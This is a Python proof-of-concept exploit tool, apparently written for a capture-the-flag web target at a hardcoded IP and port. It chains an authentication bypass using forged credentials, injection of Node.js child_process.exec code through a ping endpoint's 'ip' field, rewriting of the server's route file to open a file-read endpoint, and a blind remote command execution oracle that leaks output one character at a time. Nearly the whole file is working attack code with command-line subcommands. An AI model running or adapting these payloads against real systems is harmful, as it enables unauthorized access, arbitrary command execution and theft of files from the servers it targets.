#!/usr/bin/python3

import requests
import json
from colorama import Fore, Style, init
import argparse
import random
import string
import time
from tqdm import tqdm

init()

server="94.237.51.163" #You need change
port="31161" #You need change
url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
ping_endpoint=f"{url}/api/service/ping"
ls_endpoint=f"{url}/api/service/ls"
cat_endpoint=f"{url}/api/service/cat"

def auth_bypass():
    headers={"Content-type":"application/json"}
    payload={"uid":"user123","sid":"user123abcdefghij3f7"}
    response = requests.post(auth_endpoint, headers=headers, data=json.dumps(payload))
    token = response.json()['token']

    if token:
        print(f"{Fore.GREEN}[+]auth Bypass success!{Style.RESET_ALL}")
        print(token)
        return token
    else:
        print(f"{Fore.RED}[-]auth Bypass Failed!{Style.RESET_ALL}")
        return 
    
token = auth_bypass()

##MAIN
def modify_webserver_source_code_file_read():
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}

    payload = {"external":"true","ip":"\{\}').ip;const { exec } = require('child_process');exec('echo \"router.post(\\\\\"/cat\\\\\", cat);\" >> ./src/routes/service-routes.js', (e, o) => {req.user = { uid: o.trim()};console.log(req.user);});//"}
    response = requests.post(ping_endpoint,headers=headers,data=json.dumps(payload))

    if response.text == "":
        print (f"{Fore.GREEN}[+]Add code success!{Style.RESET_ALL}")
        return
    else:
        print (f"{Fore.RED}[-]Add code failed!{Style.RESET_ALL}")
        return

def clean_modify_webserver_source_code_file_read():
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}

    payload = {"external":"true","ip":"\{\}').ip;const { exec } = require('child_process');exec(`sed -i '$d' ./src/routes/service-routes.js`, (e, o) => {req.user = { uid: o.trim()};console.log(req.user);});//"}
    response = requests.post(ping_endpoint,headers=headers,data=json.dumps(payload))

    if response.text == "":
        print (f"{Fore.GREEN}[+]Clean code success!{Style.RESET_ALL}")
        return
    else:
        print (f"{Fore.RED}[-]Clean code failed!{Style.RESET_ALL}")
        return


def file_read(path):
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}
    
    modify_webserver_source_code_file_read()
    payload = {"path":f"{path}"}
    response = requests.post(cat_endpoint,headers=headers,data=json.dumps(payload))
    print(f"[*]LFI the file: {path} \n Response:{response.status_code}")
    clean_modify_webserver_source_code_file_read()

    if response.status_code == 200:
        res = response.text
        print(f"{Fore.GREEN}[+]file read success!{Style.RESET_ALL}")
        print(res)
        return res
    else:
        print(f"{Fore.RED}[-]file read failed!{Style.RESET_ALL}")
        return 
    
def build_blindRCE_payload(cmd,index,test_char,file_to_touch):
    bash = f'if [ \"$({cmd}| head -c {index} | tail -c 1)\" = \"{test_char}\" ]; then touch {file_to_touch} ; fi'
    js_payload = (
        f"{{}}').ip;const {{ exec }} = require('child_process');"
        f"exec('{bash}', (e, o) => {{}});//"
    )
    return js_payload

def build_cmd_payload(cmd):
    bash = f'{cmd}'
    js_payload = (
        f"{{}}').ip;const {{ exec }} = require('child_process');"
        f"exec('{bash}', (e, o) => {{}});//"
    )
    return js_payload

def generateFile(cmd,index,test_char,file_to_touch):
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}

    #gen file
    payload_pre = build_blindRCE_payload(cmd,index,test_char,file_to_touch)
    payload = json.dumps({
    "external": "true",
    "ip": payload_pre
    })

    response = requests.post(ping_endpoint,headers=headers,data=payload)


def cleanFile(rand_hex):
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}

    #clean file
    payload_pre = build_cmd_payload(f"rm {rand_hex}")
    payload = json.dumps({
    "external": "true",
    "ip": payload_pre
    })
    response = requests.post(ping_endpoint,headers=headers,data=(payload))

def checkFile(filename):
    if token:
        headers={"Content-type":"application/json","Authorization":f"Bearer {token}"}
    
    payload = json.dumps({
    "path": "./"
    })
    response = requests.post(ls_endpoint,headers=headers,data=(payload))

    if filename in response.text:
        return True
    else:
        return False

def blind_success_respond(cmd,index,test_char):
    rand_hex = ''.join(random.choices('0123456789abcdef', k=8))
    generateFile(cmd,index,test_char,rand_hex)
    res = checkFile(rand_hex)
    cleanFile(rand_hex)
    
    return res

def BlindRCE(cmd):

    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:\'",.<>/?'
    print(f"{Fore.YELLOW}[*]Blind injecting ! It's may be a long time (About 30min){Style.RESET_ALL}")
    #blind
    max_fail = 5
    for index in range (1,200):
        found = False
        for test_char in charset :
            if blind_success_respond(cmd,index,test_char):
                print(test_char,end='',flush=True)
                found = True
                fail_count = 0  # 猜对了，清零
                break
        if not found:
            fail_count += 1
            if fail_count >= max_fail:
                print('\n')
                break
    
def main():
    parser = argparse.ArgumentParser(description="PoC Exploit Tool")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # 子命令 authbypass
    parser_auth = subparsers.add_parser('authBypass', help='Run auth bypass exploit')
    parser_auth.set_defaults(func=auth_bypass)

    # 子命令 fileRead
    parser_read = subparsers.add_parser('fileRead', help='Read a file from remote target')
    parser_read.add_argument('path', help='Path to file to read')
    parser_read.set_defaults(func=lambda args: file_read(args.path))

    # 子命令 RCE
    parser_read = subparsers.add_parser('BlindRCE', help='Use /api/service/ping to reach a RCE vul')
    parser_read.add_argument('cmd', help='Command to execute')
    parser_read.set_defaults(func=lambda args: BlindRCE(args.cmd))

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
    else:
        args.func(args)

if __name__ == "__main__":
    main()
